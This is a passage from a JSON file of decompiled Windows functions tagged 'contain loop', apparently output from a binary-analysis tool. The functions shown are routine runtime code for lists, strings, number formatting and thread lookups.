        "decompiled_code": "\nvoid fcn.00406fb8(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if ((*0x49003c == NULL) || ((*0x49003c)[1] != in_EAX)) {\n        ppiVar2 = *0x49003c;\n        if (*0x49003c != NULL) {\n            do {\n                ppiVar1 = *ppiVar2;\n                if ((ppiVar1 != NULL) && (ppiVar1[1] == in_EAX)) {\n                    *ppiVar2 = *ppiVar1;\n                    fcn.00402f0c();\n                    return;\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n    }\n    else {\n        *0x49003c = **0x49003c;\n        fcn.00402f0c();\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "00407088": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00407088(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x4070ec;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_4h = in_EAX;\n    fcn.0040701c();\n    *in_FS_OFFSET = uStack20;\n    puVar1 = *0x490038;\n    if (var_4h == *0x490038) {\n        *0x490038 = *var_4h;\n    }\n    else {\n        for (; puVar1 != NULL; puVar1 = *puVar1) {\n            if (*puVar1 == var_4h) {\n                *puVar1 = *var_4h;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00409b48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409b48(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00405de8();\n    for (iVar2 = 1; (iVar2 <= iVar1 && (*(in_EAX + -2 + iVar2 * 2) < 0x21)); iVar2 = iVar2 + 1) {\n    }\n    if (iVar1 < iVar2) {\n        fcn.00405c48();\n    }\n    else {\n        for (; *(in_EAX + -2 + iVar1 * 2) < 0x21; iVar1 = iVar1 + -1) {\n        }\n        fcn.00405e78(param_2);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00409c9c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409c9c(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    if (param_1 == '\\0') {\n        if (in_EAX < 0) {\n            fcn.00409cb2();\n            unaff_ESI[-1] = 0x2d;\n            return;\n        }\n        param_1 = 10;\n    }\n    do {\n        uVar2 = in_EAX / param_1;\n        puVar6 = puVar6 + -1;\n        cVar4 = in_EAX % param_1;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n        in_EAX = uVar2;\n    } while (uVar2 != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar1 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar1)[iVar5] = 0x30;\n        }\n        puVar6[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "0040a9e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a9e0(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = 0;\n    iVar6 = param_1;\n    pcVar7 = param_2;\n    if (param_1 != 0) {\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        param_1 = param_1 - iVar6;\n        bVar8 = true;\ncode_r0x0040a9f9:\n        do {\n            if (param_1 != 0) {\n                param_1 = param_1 + -1;\n                pcVar1 = param_2 + 1;\n                pcVar7 = in_EAX + 1;\n                bVar8 = *in_EAX == *param_2;\n                in_EAX = pcVar7;\n                param_2 = pcVar1;\n                if (bVar8) goto code_r0x0040a9f9;\n            }\n            if (bVar8) {\n                return;\n            }\n            uVar3 = in_EAX[-1];\n            uVar5 = uVar4 & 0xffffff00 | uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n            }\n            uVar3 = param_2[-1];\n            uVar4 = uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar4 = uVar3 - 0x20;\n            }\n            uVar4 = uVar5 - uVar4;\n            bVar8 = uVar4 == 0;\n        } while (bVar8);\n    }\n    return;\n}\n",
        "token_count": 509
    },
    "0040aa24": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040aa24(uint param_1, char param_2)\n\n{\n    char *in_EAX;\n    \n    while( true ) {\n        if (param_2 == *in_EAX) {\n            return in_EAX;\n        }\n        if (*in_EAX == '\\0') break;\n        in_EAX = in_EAX + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 89
    },
    "0040aa38": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040aa38(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    if ((in_EAX != NULL) && (param_2 != NULL)) {\n        uVar2 = 0xffffffff;\n        pcVar7 = param_2;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        if (uVar3 != 0) {\n            uVar4 = 0xffffffff;\n            pcVar7 = in_EAX;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = ~uVar4 - uVar3;\n            bVar9 = iVar5 == 0;\n            if (uVar3 <= ~uVar4 && !bVar9) {\n                do {\n                    pcVar7 = param_2 + 1;\n                    pcVar8 = in_EAX;\n                    do {\n                        in_EAX = pcVar8;\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        in_EAX = pcVar8 + 1;\n                        bVar9 = *param_2 == *pcVar8;\n                        pcVar8 = in_EAX;\n                    } while (!bVar9);\n                    iVar6 = ~uVar2 - 2;\n                    pcVar8 = in_EAX;\n                    if (!bVar9) {\n                        return NULL;\n                    }\n                    do {\n                        if (iVar6 == 0) break;\n                        bVar9 = *pcVar7 == *pcVar8;\n                        iVar6 = iVar6 + -1;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar7 = pcVar7 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        return in_EAX + -1;\n                    }\n                } while( true );\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 579
    },
    "0040acae": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040acae(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *puVar3;\n    char cVar4;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint extraout_ECX;\n    unkbyte3 Var8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint8_t *puVar11;\n    float10 fVar12;\n    float10 fVar13;\n    float10 fVar14;\n    uint var_69h;\n    uint var_59h;\n    uint var_49h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    char cVar5;\n    \n    iVar9 = *(unaff_EBP + -0xc);\n    if (iVar9 <= *(unaff_EBP + 8)) {\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n    // WARNING: Could not recover jumptable at 0x0040acce. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x40acd5\n        (**(*(*(unaff_EBP + 0xc) + iVar9 * 8 + 4) * 4 + 0x40acd5))();\n        return;\n    }\n    do {\n        fcn.0040aedb();\n        puVar3 = fcn.0040aafc();\n        uVar10 = *(unaff_EBP + -0x24);\n        if (0x20 < uVar10) {\n            uVar10 = 0;\n        }\n        cVar5 = extraout_ECX;\n        Var8 = extraout_ECX >> 8;\n        cVar4 = cVar5 + -0x44;\n        if (cVar4 == '\\0') break;\n        cVar4 = '\\x10';\n        Var8 = 0;\n        if (cVar5 == 'X') break;\n        cVar4 = '\\n';\n        Var8 = 0;\n    } while (cVar5 != 'U');\n    iVar6 = CONCAT31(Var8, cVar4);\n    if ((cVar4 == '\\0') && (iVar6 = 10,  (*(puVar3 + 4) & 0x80000000) != 0)) {\n        fcn.00409d3c(-*puVar3, -(*(puVar3 + 4) + (*puVar3 != 0)));\n        *(unaff_EBP + -0x4a) = 0x2d;\n        return;\n    }\n    if ((*(puVar3 + 4) & 0x80000000) == 0) {\n        fVar14 = *puVar3;\n    }\n    else {\n        fVar14 = 0x7fffffffffffffff + 1 + (*puVar3 & 0x7fffffffffffffff);\n    }\n    fVar12 = iVar6;\n    puVar11 = unaff_EBP + -0x49;\n    do {\n        puVar11 = puVar11 + -1;\n        fVar13 = fVar14 - (fVar14 / fVar12) * fVar12;\n        fVar14 = fVar14 / fVar12;\n        var_4h._0_1_ = ROUND(fVar13);\n        uVar2 = var_4h + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = var_4h + 0x37;\n        }\n        *puVar11 = uVar2;\n    } while (1 <= fVar14);\n    uVar7 = (unaff_EBP + -0x49) - puVar11;\n    iVar9 = uVar10 - uVar7;\n    if (uVar7 <= uVar10 && iVar9 != 0) {\n        iVar1 = -iVar9;\n        while (iVar9 = iVar9 + -1,  iVar9 != 0) {\n            (puVar11 + iVar1)[iVar9] = 0x30;\n        }\n        puVar11[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 985
    },
    "0040b667": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b667(void)\n\n{\n    char cVar1;\n    char *unaff_ESI;\n    \n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 == '\\0') {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (cVar1 == ' ');\n    return;\n}\n",
        "token_count": 85
    },
    "0040c8c8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c8c8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.0040572c();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) != ' ')) break;\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    return;\n}\n",
        "token_count": 129
    },
    "0040ca94": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040ca94(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 1;\n    while( true ) {\n        iVar2 = fcn.0040572c();\n        if (iVar2 < iVar3) {\n            return 0;\n        }\n        uVar1 = *(in_EAX + -1 + iVar3) & 0xdf;\n        if (uVar1 == 0x44) {\n            return 1;\n        }\n        if (uVar1 == 0x45) {\n            return 2;\n        }\n        if (uVar1 == 0x4d) break;\n        if (uVar1 == 0x59) {\n            return 2;\n        }\n        iVar3 = iVar3 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 199
    },
    "0040e9ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e9ac(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.0040e9e0();\n    iVar3 = iVar2;\n    if (param_2 != '\\0') {\n        while (iVar1 = iVar3,  iVar1 != 0) {\n            iVar3 = fcn.0040e9e0();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 127
    },
    "0040e9e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040e9e0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0040aa24();\n    while ((iVar2 != 0 && (cVar1 = fcn.0040e49c(),  cVar1 != '\\0'))) {\n        iVar2 = fcn.0040aa24();\n    }\n    return iVar2;\n}\n",
        "token_count": 94
    },
    "0040f294": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar fcn.0040f294(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = '\\x01';\n    for (puVar2 = *0x490a18; (cVar1 != '\\0' && (puVar2 != NULL)); puVar2 = *puVar2) {\n        cVar1 = (*puVar2[1])();\n    }\n    return cVar1;\n}\n",
        "token_count": 97
    },
    "0040f518": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f518(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    uVar1 = fcn.0040f4fc();\n    iVar2 = sub.kernel32.dll_GetCurrentThreadId_1();\n    for (puVar3 = *(in_EAX + 4 + (uVar1 & 0xff) * 4); (puVar3 != NULL && (iVar2 != puVar3[1])); puVar3 = *puVar3) {\n    }\n    if (puVar3 == NULL) {\n        puVar3 = fcn.0040f5a0();\n        if (puVar3 == NULL) {\n            puVar3 = fcn.00402ed8();\n            puVar3[1] = iVar2;\n            puVar3[2] = 0x7fffffff;\n            *puVar3 = puVar3;\n            uVar4 = fcn.0040f494();\n            *puVar3 = uVar4;\n        }\n    }\n    *param_2 = puVar3;\n    return;\n}\n",
        "token_count": 269
    },
    "0040f5a0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.0040f5a0(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar2 = fcn.0040f4fc();\n    puVar1 = *(in_EAX + 4 + (uVar2 & 0xff) * 4);\n    while( true ) {\n        if (puVar1 == NULL) {\n            return NULL;\n        }\n        iVar3 = fcn.0040f494();\n        if (iVar3 != 0x7fffffff) break;\n        puVar1 = *puVar1;\n    }\n    uVar4 = sub.kernel32.dll_GetCurrentThreadId_1();\n    puVar1[1] = uVar4;\n    return puVar1;\n}\n",
        "token_count": 186
    },
    "00410fe4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410fe4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x411229;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00410fe4::var_18h;\n    if (in_EAX < -0x7ffdfff5) {\n        if (in_EAX == -0x7ffdfff6) {\n            var_1ch = 0x4110ba;\n            var_10h = &stack0xfffffffc;\n            fcn.004075f4();\n            var_1ch = 0x4110c9;\n            fcn.0040da70();\n            var_1ch = 0x4110ce;\n            fcn.00404eb4();\n            goto code_r0x00411201;\n        }\n        if (in_EAX < -0x7ffdfffa) {\n            if (in_EAX == -0x7ffdfffb) {\n                var_1ch = 0x411078;\n                var_10h = &stack0xfffffffc;\n                fcn.00410db0();\n                goto code_r0x00411201;\n            }\n            if (in_EAX == -0x7fffbfff) {\n                var_1ch = 0x41112c;\n                var_10h = &stack0xfffffffc;\n                fcn.004075f4();\n                var_1ch = 0x41113b;\n                fcn.0040da70();\n                var_1ch = 0x411140;\n                fcn.00404eb4();\n                goto code_r0x00411201;\n            }\n            if (in_EAX == -0x7fff0001) {\n                var_1ch = 0x41119b;\n                var_10h = &stack0xfffffffc;\n                fcn.004075f4();\n                var_1ch = 0x4111aa;\n                fcn.0040da70();\n                var_1ch = 0x4111af;\n                fcn.00404eb4();\n                goto code_r0x00411201;\n            }\n        }\n        else {\n            if (in_EAX == -0x7ffdfff8) {\n                var_1ch = 0x41108a;\n                var_10h = &stack0xfffffffc;\n                fcn.004075f4();\n                var_1ch = 0x411099;\n                fcn.0040da70();\n                var_1ch = 0x41109e;\n                fcn.00404eb4();\n                goto code_r0x00411201;\n            }\n            if (in_EAX == -0x7ffdfff7) {\n                var_1ch = 0x4110a8;\n                var_10h = &stack0xfffffffc;\n                fcn.00410ea0();\n                goto code_r0x00411201;\n            }\n        }\n    }\n    else {\n        if (in_EAX == -0x7ffdfff5) {\n            var_1ch = 0x4110e0;\n            fcn.004075f4();\n            var_1ch = 0x4110ef;\n            fcn.0040da70();\n            var_1ch = 0x4110f4;\n            fcn.00404eb4();\n            goto code_r0x00411201;\n        }\n        if (in_EAX == -0x7ffdfff3) {\n            var_1ch = 0x411106;\n            var_10h = &stack0xfffffffc;\n            fcn.004075f4();\n            var_1ch = 0x411115;\n            fcn.0040da70();\n            var_1ch = 0x41111a;\n            fcn.00404eb4();\n            goto code_r0x00411201;\n        }\n        if (in_EAX == -0x7ff8fff2) {\n            var_1ch = 0x411152;\n            var_10h = &stack0xfffffffc;\n            fcn.004075f4();\n            var_1ch = 0x411161;\n            fcn.0040da70();\n            var_1ch = 0x411166;\n            fcn.00404eb4();\n            goto code_r0x00411201;\n        }\n        if (in_EAX == -0x7ff8ffa9) {\n            var_1ch = 0x411178;\n            var_10h = &stack0xfffffffc;\n            fcn.004075f4();\n            var_1ch = 0x411187;\n            fcn.0040da70();\n            var_1ch = 0x41118c;\n            fcn.00404eb4();\n            goto code_r0x00411201;\n        }\n    }\n    var_38h = **0x492a74;\n    var_34h._0_1_ = 0xb;\n    var_2ch._0_1_ = 0;\n    var_1ch = 0x4111d0;\n    var_10h = &stack0xfffffffc;\n    fcn.0040d25c();\n    var_1ch = &fcn.00410fe4::var_38h;\n    var_20h = 2;\n    var_24h = 0x4111ed;\n    fcn.004075f4();\n    var_24h = 0x4111fc;\n    fcn.0040daac(var_20h, var_1ch);\n    var_24h = 0x411201;\n    fcn.00404eb4();\ncode_r0x00411201:\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x411230;\n    var_1ch = 0x41121b;\n    fcn.00405490();\n    var_1ch = 0x411228;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1554
    },
    "00416490": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00416490(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    \n    if (param_2 != 0) {\n        iVar2 = **(in_EAX + 0xb + *(in_EAX + 1));\n        uVar3 = *(iVar2 + 1);\n        puVar4 = iVar2 + 0xf + uVar3;\n        piVar1 = iVar2 + 7 + uVar3;\n        iVar2 = 0;\n        do {\n            uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            if (uVar3 == *(param_2 + -4)) {\n                while (((*((uVar3 - 1) + param_2) ^ puVar4[uVar3]) & 0xdf) == 0) {\n                    uVar3 = uVar3 - 1;\n                    if (uVar3 == 0) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + uVar3 + 1;\n        } while (iVar2 <= *piVar1);\n    }\n    return -1;\n}\n",
        "token_count": 321
    },
    "00416540": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416540(uint param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar4;\n    uchar *puVar3;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (in_EAX != 0) {\n        puVar3 = param_2;\n        if (param_2 != NULL) {\n            puVar3 = CONCAT11(*param_2, param_2[-4]) & 0xdfff;\n        }\n        while( true ) {\n            iVar1 = in_EAX + 2 + *(in_EAX + 1);\n            uVar6 = *(iVar1 + 10);\n            uVar7 = *(iVar1 + 0xb + uVar6);\n            if (uVar7 != 0) {\n                iVar2 = iVar1 + 0xd + uVar6;\n                do {\n                    puVar5 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffffdfff;\n                    if (puVar5 == puVar3) {\n                        uVar6 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffff00ff;\n                        while( true ) {\n                            uVar4 = param_2[uVar6 - 1] ^ *(iVar2 + 0x1a + uVar6);\n                            if ((uVar4 & 0xdf) != 0) break;\n                            uVar6 = uVar6 - 1;\n                            puVar3 = puVar3 & 0xffff0000 | CONCAT11(uVar4, puVar3);\n                            if (uVar6 == 0) {\n                                return;\n                            }\n                        }\n                        puVar3 = puVar3 & 0xffff0000 | CONCAT11(*param_2, puVar3) & 0xffffdfff;\n                        puVar5 = uVar6 & 0xffffff00 | *(iVar2 + 0x1a);\n                    }\n                    uVar6 = puVar5 & 0xffff00ff;\n                    uVar7 = uVar7 - 1;\n                    iVar2 = iVar2 + 0x1b + uVar6;\n                } while (uVar7 != 0);\n            }\n            if (*(iVar1 + 4) == NULL) break;\n            in_EAX = **(iVar1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "00418614": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418614(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((*(in_EAX + 4) != 0) && (iVar3 = *(*(in_EAX + 4) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.004197d8();\n            cVar1 = fcn.00404534();\n            if (cVar1 != '\\0') goto code_r0x00418673;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if ((*(in_EAX + 8) == NULL) || (iVar3 = (**(**(in_EAX + 8) + 0x54))(),  iVar3 < 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(**(in_EAX + 8) + 0x18))();\n    }\ncode_r0x00418673:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 264
    },
    "0041867c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.0041867c(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004197d8();\n            cVar1 = fcn.0040486c();\n            if (cVar1 != '\\0') goto code_r0x004186b6;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x004186b6:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 236
    },
    "00418870": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418870(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x20) != param_2) {\n        *(in_EAX + 0x20) = param_2;\n        iVar3 = *(*(in_EAX + 4) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar2 = fcn.004197d8();\n                uVar1 = fcn.0041867c();\n                *(iVar2 + 0x10) = uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00418990": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418990(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004197d8();\n            uVar2 = fcn.00418508(param_2);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 142
    },
    "00418b98": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.00418b98(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004197d8();\n            cVar1 = fcn.00418780();\n            if (cVar1 != '\\0') goto code_r0x00418bd0;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00418bd0:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 234
    },
    "00418bdc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418bdc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004197d8();\n            iVar1 = fcn.00419834();\n            if (-1 < iVar1) {\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00418578();\n    fcn.00419680();\n    return;\n}\n",
        "token_count": 143
    },
    "00418f58": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418f58(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = 0x418f68;\n    fcn.00418b74();\n    uStack16 = 0x418fbd;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    while( true ) {\n        cVar1 = fcn.00418b98();\n        if (cVar1 != '\\0') break;\n        fcn.00418b80();\n        if (in_EAX == *0x4174bc) break;\n        in_EAX = fcn.004045cc();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x418fc4;\n    uStack16 = 0x418fbc;\n    fcn.00418c2c();\n    return;\n}\n",
        "token_count": 237
    },
    "00419464": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00419464(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0040772c();\n    iVar1 = *(*(iVar1 + 8) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.004197d8();\n            (**(*piVar2 + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00419834": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419834(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 126
    },
    "0041ce18": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041ce18(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar1 = *(*(in_EAX + 0x30) + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.004197d8();\n                fcn.00404640();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00404640();\n        *(in_EAX + 0x30) = 0;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0041d150": {
        "rules": [
            "contain loop"
        ],
